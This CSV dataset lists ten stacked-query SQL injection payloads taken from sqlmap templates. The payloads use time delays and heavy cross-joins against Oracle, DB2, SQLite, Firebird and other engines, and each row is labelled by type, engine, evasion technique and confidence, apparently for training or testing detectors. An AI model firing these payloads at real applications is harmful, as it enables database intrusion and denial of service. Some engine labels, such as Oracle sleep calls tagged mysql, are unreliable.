payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
";SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL",stacked_queries,oracle,case_variation,0.56,rule,sqlmap_xml,unknown
";SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5",stacked_queries,unknown,case_variation,0.9,rule,sqlmap_xml,unknown
;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END,stacked_queries,mysql,,0.5,rule,sqlmap_xml,unknown
;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END,stacked_queries,mysql,,0.5,rule,sqlmap_xml,unknown
";SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3",stacked_queries,unknown,case_variation,0.9,rule,sqlmap_xml,unknown
";SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",stacked_queries,sqlite,case_variation,0.57,rule,sqlmap_xml,unknown
";SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4",stacked_queries,unknown,case_variation,0.9,rule,sqlmap_xml,unknown
";SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3",stacked_queries,unknown,case_variation,0.9,rule,sqlmap_xml,unknown
";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)",stacked_queries,unknown,function_alternative,0.9,rule,sqlmap_xml,unknown
";CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)",stacked_queries,unknown,function_alternative,0.9,rule,sqlmap_xml,unknown
